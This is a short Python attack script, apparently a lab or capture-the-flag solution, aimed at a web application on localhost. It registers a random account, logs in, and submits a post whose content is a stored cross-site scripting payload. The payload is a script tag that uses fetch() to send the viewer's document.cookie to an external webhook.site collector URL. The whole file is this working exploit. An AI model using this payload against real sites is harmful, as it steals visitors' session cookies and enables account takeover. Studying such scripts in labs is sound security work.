#! /usr/bin/python3
import requests
import bs4
import random
import string

PORT = 5000
BASEURL = f"http://localhost:{PORT}"
WEBHOOK = "https://webhook.site/481a5dbb-65d1-40b3-aa55-63dbf7dc87ac"
def do_login(session: requests.Session):
    AUTH = {
        "username": ''.join(random.choice(string.ascii_letters) for i in range(16)),
        "password": ''.join(random.choice(string.ascii_letters) for i in range(16))}
    resp = session.post(
        f"{BASEURL}/register",
        data=AUTH,
        headers={"Content-Type": "application/x-www-form-urlencoded"})
    print(resp.text)
    resp = session.post(
        f"{BASEURL}/login",
        data=AUTH,
        headers={"Content-Type": "application/x-www-form-urlencoded"})
    print(resp.text)


def make_post(session: requests.Session):
    TITLE = "Hacked"
    CONTENT = f"<script>fetch(`{WEBHOOK}?${{document.cookie}}`);</script>"
    resp = session.post(f"{BASEURL}/posts/new",
                        data={"title": TITLE, "content": CONTENT},
                        headers={"Content-Type": "application/x-www-form-urlencoded"})
    print(resp.text)


with requests.session() as s:
    do_login(s)
    make_post(s)
